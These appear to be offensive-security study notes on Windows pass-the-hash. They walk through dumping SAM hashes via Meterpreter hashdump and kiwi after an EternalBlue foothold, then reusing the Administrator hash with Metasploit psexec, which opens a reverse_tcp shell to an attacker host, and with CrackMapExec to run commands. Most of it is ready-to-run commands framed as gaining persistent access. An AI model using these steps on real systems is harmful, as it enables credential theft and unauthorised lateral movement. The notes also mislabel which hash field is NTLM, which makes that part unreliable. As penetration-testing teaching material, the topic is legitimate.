## What Is Pass-The-Hash?

- **Technique**: Use **NTLM hash** (instead of plaintext password) to authenticate to SMB/RPC services.
- **Why?** Windows accepts hashes for authentication â†’ no need to crack them.
- **Goal**: Move laterally or regain access when original exploit is patched/firewalled.

> ðŸ’¡ If your initial shell dies (e.g., service patched), but you have the **admin hash**, you can **reconnect anytime**.

---

## Why Bother If You Already Have SYSTEM?

### Scenario:
- You got `meterpreter` via **EternalBlue** â†’ `NT AUTHORITY\SYSTEM`.
- But:  
  - The SMB service gets **patched**  
  - Firewall blocks **port 445**  
  - Exploit process **crashes**

â†’ Your session dies.  
âœ… But if you **dumped the local admin hash**, you can **re-authenticate** via **SMB** using PtH â€” no exploit needed.

> ðŸ”‘ **PtH = persistent, reliable access** using legitimate auth.

---

## Step-by-Step Workflow

### 1. **Initial Access & Hash Dumping**
```msf
# After exploit (e.g., EternalBlue)
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

# Optional: Migrate to lsass.exe (more stable for dumping)
meterpreter > pgrep lsass    # Find PID (e.g., 780)
meterpreter > migrate 780
```

#### What is `lsass.exe`?
- **Local Security Authority Subsystem Service**  
- Stores **in-memory credentials/hashes**  
- Required for `kiwi`/`hashdump`

---

### 2. **Dump Hashes**
#### Option A: Built-in `hashdump`
```msf
meterpreter > hashdump
```
â†’ Outputs **NTLM hashes** of **local SAM accounts** only.

#### Option B: `kiwi` (More Powerful)
```msf
meterpreter > load kiwi
meterpreter > lsa_dump_sam
```
â†’ Also dumps **LM hashes** + more detailed output.  
â†’ Can also dump **domain cached creds** if machine is domain-joined.

> â“ **Why use `kiwi` if `hashdump` exists?**  
> - `kiwi` = advanced (Mimikatz integration)  
> - Can extract **tickets, secrets, domain hashes**  
> - But for **local PtH**, `hashdump` is enough.

> âœ… **Save NTLM hash** (second field):  
> `Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`  
> â†’ **NTLM = `aad3...89c0`**

---

### 3. **Pass-The-Hash with Metasploit (PsExec)**

#### Background Session
```msf
meterpreter > background   # or Ctrl+Z
```

#### Launch PsExec Module
```msf
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.10
set SMBUser Administrator
set SMBPass 31d6cfe0d16ae931b73c59d7e0c089c0  # NTLM hash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4422   # Avoid conflict with existing session
```

#### Set Correct Target
```msf
show targets
set TARGET 2     # e.g., "Native\ upload"
exploit
```

âœ… Result: New `meterpreter` as `NT AUTHORITY\SYSTEM`.

---

### 4. **Pass-The-Hash with CrackMapExec (Faster)**
```bash
# Check access
crackmapexec smb 192.168.1.10 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Output: [+] PWN3D!

# Execute command
crackmapexec smb 192.168.1.10 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -x 'ipconfig'
```

> âš¡ **CME is faster, quieter, and doesnâ€™t spawn Meterpreter** â€” ideal for quick checks.

---

## Key Clarifications

| Question | Answer |
|--------|--------|
| **Whose hashes are dumped?** | **Local SAM users** (unless domain-joined â†’ may include cached domain creds) |
| **Why `kiwi` vs `hashdump`?** | `hashdump` = local NTLM only; `kiwi` = full Mimikatz (tickets, domain, secrets) |
| **Do I get SYSTEM with PtH?** | **Yes** â€” if you use **local admin hash**, PsExec/CME gives **full SYSTEM** |
| **Is PtH detectable?** | Yes â€” but still widely used; modern EDR may flag it |

---

## Best Practices
- Always **dump hashes** after SYSTEM access.
- Use **CrackMapExec** for speed, **Metasploit** for payload delivery.
- **Never rely on a single exploit** â€” PtH gives you **resilient access**.

> ðŸ”¥ **Hash = Password** in Windows networks. Steal it, own the system â€” forever.

